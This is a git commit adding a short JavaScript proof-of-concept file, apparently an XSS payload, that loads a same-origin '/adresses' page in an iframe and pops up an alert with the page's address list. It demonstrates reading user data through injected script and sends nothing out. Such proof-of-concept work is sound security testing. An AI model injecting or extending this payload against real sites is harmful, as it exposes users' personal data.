ff47cc125871709de9b458bceb809cdc9623a0a4
g6g <gaetan.guibaud@gmail.com>
2025-09-18 10:24:28 +0200

    import script payload

---
+++ poc/import2.js
@@ -0,0 +1,12 @@
+var ifrm = document.createElement("iframe");
+ifrm.setAttribute("src", "/adresses");
+ifrm.style.width = "800px";
+ifrm.style.height = "800px";
+document.body.appendChild(ifrm);
+
+ifrm.onload = function () {
+    setTimeout(function () {
+        var contentWindow = ifrm.contentWindow;
+        alert(contentWindow.document.getElementById("addresslist").outerHTML);
+    }, 6000); // Wait for 1 second before executing the code
+};
